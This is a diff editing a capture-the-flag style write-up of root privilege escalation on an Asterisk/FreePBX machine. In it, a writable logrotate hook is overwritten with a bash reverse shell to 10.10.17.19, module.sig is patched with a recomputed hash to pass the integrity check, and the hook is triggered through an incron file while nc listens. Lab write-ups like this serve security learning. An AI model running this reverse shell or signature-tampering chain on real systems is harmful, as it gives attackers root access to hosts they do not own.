@@ -80,7 +80,6 @@ The sysadmin_manager parses the filename into two parts:
 
 Then locates the corresponding script at /var/www/html/admin/modules/ucp/hooks/ and executes it.
 
-
 Lets see if there are writable hooks:
 
 	$ ls -la /var/www/html/admin/modules/ucp/hooks/
@@ -90,7 +89,7 @@ Lets see if there are writable hooks:
 - We've got write permissions for logrotate.
 
 
-Were going to write a reverse shell to logrotate, but first check which ports are currently in use:
+Were going to write a reverse shell command in logrotate, but first check which ports are currently in use:
 
 	$ ss -ntlp
 	State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
@@ -110,7 +109,7 @@ Were going to write a reverse shell to logrotate, but first check which ports ar
 
 Overwrite the logrotate file:
 
-	$ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.17.19/8989 0>&1' > /var/www/html/admin/modules/ucp/hooks/logrotate
+	$ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.17.19/5555 0>&1' > /var/www/html/admin/modules/ucp/hooks/logrotate
 
 
 Since we have changed the file, the new hash will not match what what is expected:
@@ -119,20 +118,16 @@ Since we have changed the file, the new hash will not match what what is expecte
 	hooks/logrotate = a8ed4f168fa04f0ff884079ad214e854004b9a5511d26c6c9f6080daaf590781
 
 
-Thankfully weve got write permissions for this file:
+Fortunately for us, we've got write permissions for this file:
 
 	$ ls -l /var/www/html/admin/modules/ucp/module.sig
 	-rw-rw-r--. 1 asterisk asterisk 249099 Nov  2  2023 /var/www/html/admin/modules/ucp/module.sig
 
 
-Modify logrotate hash:
+Modify logrotate hash in module.sig:
 
 	$ hash=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}'); echo $hash
 	b420c8f2d0ed535cc60521b2e16ea45dc963c45a3c62bc190f7ababae6f509ba
-
-
-
-Now we need to modify the signature file:
 
 	$ sed -i "s|hooks/logrotate = .*|hooks/logrotate = $hash|" /var/www/html/admin/modules/ucp/module.sig
 
@@ -143,15 +138,14 @@ Verify that the hashes match:
 	$ echo $hash
 
 
+Setup listener on 
 
-Setup listener 
-
-	$ nc -nvlp 8989
+	$ nc -nvlp 5555
 
 
 Now we can trigger the logrotate hook:
 
-	$ touch /usr/local/asterisk/incron/ucp.logrotate
+	$ touch /var/spool/asterisk/incron/ucp.logrotate
 
 
 If we go back to our listener, we'll have a shell with root privileges, from here the we can get the flag in the root directory.
